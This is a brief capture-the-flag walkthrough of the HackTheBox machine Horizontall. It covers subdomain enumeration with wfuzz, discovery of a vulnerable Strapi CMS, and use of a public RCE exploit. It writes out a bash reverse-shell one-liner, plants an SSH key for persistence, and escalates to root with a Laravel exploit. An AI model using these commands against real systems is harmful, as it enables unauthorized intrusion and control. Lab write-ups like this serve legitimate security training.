# Information Gathering

## Port 80

In port 80 we have a website hosted on an nginx server, although we first have to include the route to the ip (add 10.10.11.105 horizontall.htb to hosts)

The web apparently does not have any interactive field. Check subdomains and subdirs.

- Sub-directory listing wit ``wfuzz -c -u 10.10.11.105/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc=404 --follow --hw=43 -t 200`` did not find any interesting subdirectory. Note we add the ``--follow`` option to follow redirecitons.
- Sub-domain listing with ``wfuzz -c -u 10.10.11.105 -H "HOST: FUZZ.horizontall.htb" -w /home/kali/Desktop/subdomains-top1mil-20000.txt -t 200 --follow --hw=43`` also did not find anything interesting.

At this point, seems like there are no defalult-pages or directories that we can look at. Also, the webpage seems not to be interactive at all, so seems that what we habe only left is to analyze the scripts that the app runs when it loads.

Geting all the petitons made by the app when reloading gives us a buch of petitons, among them, one calls to ``http://horizontall.htb/js/app.c68eb462.js`` so let's take a look on that. Analyzing the code leads to an interesting path: ``http://api-prod.horizontall.htb/reviews``

When we go to that path we find a list of json reviews. If we go to the index, we find a page that only says "Welcome". If we run ``whatweb`` against the new sub-domain we found, we see that its using a CMS called strapi, so lets see if it has known vulnerabilities. Indeed. version 3.0.0-beta 17.4 is vulnerable and has multiple known exploits. searchsploit shows us one with rce located at ``/usr/share/exploitdb/exploits/multiple/webapps/50239.py``. Execute it with python. Then, write command for revershe shell `` bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'``

Once we got access to the machine we can start scanning its content, trying to find something useful. Cronjobs and SUID files are not interesting, but runing an internal port scan with ``netstat -nat`` shows us that some ports that were not open for outside connections are open for inside ones, so lets port forward those to see what's going on. To do that I first created a .ssh directory on ``/opt/strapi`` directory and added my ssh public key to the ``authorized_keys`` file. Next, I do the usual port forwarding with ssh with the command ``ssh -i strapi -L 8000:localhost:8000 strapi@horizontall.htb``. When looking for that direction on the browser, I see a laravel page. A quick lookup at the version allow us to see that is vulnerable. Using this [exploit](https://github.com/ambionics/laravel-exploits) I get root access.
